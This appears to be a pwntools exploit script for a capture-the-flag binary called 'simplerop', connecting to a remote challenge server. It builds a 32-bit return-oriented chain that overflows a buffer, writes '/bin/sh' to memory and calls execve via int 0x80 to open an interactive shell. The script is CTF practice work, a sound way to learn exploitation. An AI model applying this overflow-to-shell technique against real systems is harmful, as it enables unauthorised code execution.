from pwn import *

elf = ELF('./simplerop')

local = 0
if local == 1:
    io = process('./simplerop')
else:
    io = remote('node4.buuoj.cn',28498)

int80 = 0x080493e1
pop_eax_ret = 0x080bae06
mov_edx_ecx_ret = 0x080549e2
pop_edx_ecx_ebx_ret = 0x0806e850
payload = 'a'*(0x14+8)+p32(0xdeadbeef)+p32(pop_edx_ecx_ebx_ret)+p32(0x080ec288)+'/bin'+p32(0)+p32(mov_edx_ecx_ret)
payload += p32(pop_edx_ecx_ebx_ret)+p32(0x080ec288+4)+'/sh\x00'+p32(0)+p32(mov_edx_ecx_ret)
payload += p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(0x080ec288)+p32(int80)
io.recvuntil("input :")
io.sendline(payload)

io.interactive()
